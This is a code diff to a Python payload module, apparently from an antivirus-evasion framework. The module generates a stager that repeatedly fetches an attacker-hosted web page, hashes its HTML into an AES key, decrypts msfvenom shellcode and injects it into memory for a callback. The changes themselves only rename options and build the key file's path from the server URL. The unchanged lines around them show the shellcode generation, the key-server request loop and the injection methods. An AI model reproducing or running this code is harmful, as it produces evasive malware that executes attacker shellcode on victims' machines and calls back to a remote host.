@@ -7,7 +7,7 @@ required 16 Byte key. Than injects it into memory, and executes it.
 
 [*] Logic:
 - HTTP Request on your hosted webpage:                                     <-----
-    DOWN ----> Sleep and try to reach supplied webpage using HTTP response code |
+    DOWN ----> Sleep and try to reach supplied webpage using HTTP response code 
     UP ----> Preform MD5 hash of HTML of webpage:
         MD5 ---> pass to decryption function:
             CalL Shellcode ----> Shellcode invojes callback: WIN 
@@ -30,7 +30,7 @@ required 16 Byte key. Than injects it into memory, and executes it.
 ---------------------------------------
 Based off AES encrypt module by @christruncer 
 
-module by @KillSwitch-GUI
+module by @KillSwitch-GUI: Alex Rymdeko-Harvey
 
 
 """
@@ -58,13 +58,16 @@ class Payload:
                                  "use_pyherion" : ["N", "Use the pyherion encrypter"],
                                  "inject_method" : ["Virtual", "Virtual, Void, Heap"],
                                  "sleep_time" : ["60", "Set the sleep time between HTTP Key request"],
-                                 "target_server" : ["http://www.site.com/wordpress.html", "Set target HTML server to query for decryption key"],
-                                 "html_file_name" : ["/root/Desktop/wordpress.html", "set output path of HTML file"]}
+                                 "target_server" : ["http://www.site.com/wordpress.html", "Set target URI path of the decryption key"],
+                                 "html_file_path" : ["/root/Desktop/", "Set the output of HTML file name"]}
 
         
         
     def generate(self):
         if self.required_options["inject_method"][0].lower() == "virtual":
+                target_server = str(self.required_options["target_server"][0])
+                target_html_file = str(target_server.split('/')[-1]) 
+
                 
                 # Generate Shellcode Using msfvenom
                 Shellcode = self.shellcode.generate()
@@ -92,7 +95,7 @@ class Payload:
 
                 # Genrate Random HTML code for webserver to host key file
                
-                f = open(str(self.required_options["html_file_name"][0]),'w')
+                f = open(str(self.required_options["html_file_path"][0]) + target_html_file,'w')
                 html_data = """ 
                 <!DOCTYPE html>
                 <!--[if IE 8]>
@@ -150,7 +153,7 @@ class Payload:
                 PayloadCode += 'import md5\n'
                 PayloadCode += 'from urllib2 import Request, urlopen, URLError\n'
                 # Define Target Server "Key hosting server"
-                PayloadCode += RandKeyServer + ' = ' '"'+ self.required_options["target_server"][0] +'"' '\n'
+                PayloadCode += RandKeyServer + ' = ' '"'+ target_server +'"' '\n'
                 PayloadCode += 'while True:\n'
                 PayloadCode += ' try:\n'
                 # Open Target Server with HTTP GET request
@@ -191,6 +194,8 @@ class Payload:
                 return PayloadCode
 
         elif self.required_options["inject_method"][0].lower() == "heap":
+                target_server = str(self.required_options["target_server"][0])
+                target_html_file = str(target_server.split('/')[-1])  
             
                 # Generate Shellcode Using msfvenom
                 Shellcode = self.shellcode.generate()
@@ -221,7 +226,7 @@ class Payload:
 
                 # Genrate Random HTML code for webserver to host key file
                
-                f = open(str(self.required_options["html_file_name"][0]),'w')
+                f = open(str(self.required_options["html_file_path"][0]) + target_html_file,'w')
                 html_data = """ 
                 <!DOCTYPE html>
                 <!--[if IE 8]>
@@ -279,7 +284,7 @@ class Payload:
                 PayloadCode += 'import md5\n'
                 PayloadCode += 'from urllib2 import Request, urlopen, URLError\n'
                 # Define Target Server "Key hosting server"
-                PayloadCode += RandKeyServer + ' = ' '"'+ self.required_options["target_server"][0] +'"' '\n'
+                PayloadCode += RandKeyServer + ' = ' '"'+ target_server +'"' '\n'
                 PayloadCode += 'while True:\n'
                 PayloadCode += ' try:\n'
                 # Open Target Server with HTTP GET request
@@ -322,7 +327,8 @@ class Payload:
 
         else:
             if self.required_options["expire_payload"][0].lower() == "x":
-
+                target_server = str(self.required_options["target_server"][0])
+                target_html_file = str(target_server.split('/')[-1]) 
                 # Generate Shellcode Using msfvenom
                 Shellcode = self.shellcode.generate()
         
@@ -352,7 +358,7 @@ class Payload:
 
                 # Genrate Random HTML code for webserver to host key file
                
-                f = open(str(self.required_options["html_file_name"][0]),'w')
+                f = open(str(self.required_options["html_file_path"][0]) + target_html_file,'w')
                 html_data = """ 
                 <!DOCTYPE html>
                 <!--[if IE 8]>
@@ -412,7 +418,7 @@ class Payload:
                 PayloadCode += 'from datetime import datetime\n'
                 PayloadCode += 'from datetime import date\n\n'
                 # Define Target Server "Key hosting server"
-                PayloadCode += RandKeyServer + ' = ' '"'+ self.required_options["target_server"][0] +'"' '\n'
+                PayloadCode += RandKeyServer + ' = ' '"'+ target_server +'"' '\n'
                 PayloadCode += 'while True:\n'
                 PayloadCode += ' try:\n'
                 # Open Target Server with HTTP GET request
